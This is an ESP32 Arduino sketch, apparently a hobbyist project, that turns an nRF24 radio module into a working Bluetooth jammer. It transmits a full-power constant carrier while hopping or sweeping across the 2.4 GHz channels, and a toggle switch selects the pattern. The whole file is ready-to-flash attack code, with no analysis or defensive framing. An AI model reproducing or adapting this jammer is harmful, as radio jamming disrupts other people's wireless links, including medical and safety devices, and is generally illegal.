#include "RF24.h"
#include <ezButton.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Define SPI pins
#define SCK_PIN 14
#define MISO_PIN 12
#define MOSI_PIN 13
#define CSN_PIN 15
#define CE_PIN 16

// Create an instance of the RF24 class
RF24 radio(CE_PIN, CSN_PIN);

// Create an instance of the SPIClass
SPIClass *spi = nullptr;

byte i = 45;
unsigned int flag = 0;
ezButton toggleSwitch(33);

void setup(void) {
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  Serial.begin(115200);
  toggleSwitch.setDebounceTime(50);
  initSPI();
}

void initSPI() {
  // Initialize SPI with custom pins
  spi = new SPIClass(VSPI);
  spi->begin(SCK_PIN, MISO_PIN, MOSI_PIN, CSN_PIN);

  if (radio.begin(spi)) {
    delay(200);
    Serial.println("BLE Jammer is Started !!!");
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);   // Set value in RF24.cpp
    radio.setAddressWidth(3);  // Set value in RF24.cpp
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
  } else {
    Serial.println("BLE Jammer couldn't be started !!!");
  }
}

void two() {
  // Channel with 2 spacing hopping
  if (flag == 0) {
    i += 3;
  } else {
    i -= 3;
  }

  if ((i > 79) && (flag == 0)) {
    flag = 1;
  } else if ((i < 2) && (flag == 1)) {
    flag = 0;
  }

  radio.setChannel(i);
}

void one() {
  // Sweep channel
  for (int i = 0; i < 79; i++) {
    radio.setChannel(i);
  }
}

void loop(void) {
  toggleSwitch.loop();  // MUST call the loop() function first

  int state = toggleSwitch.getState();

  if (state == HIGH)
    two();
  else {
    one();
  }
}
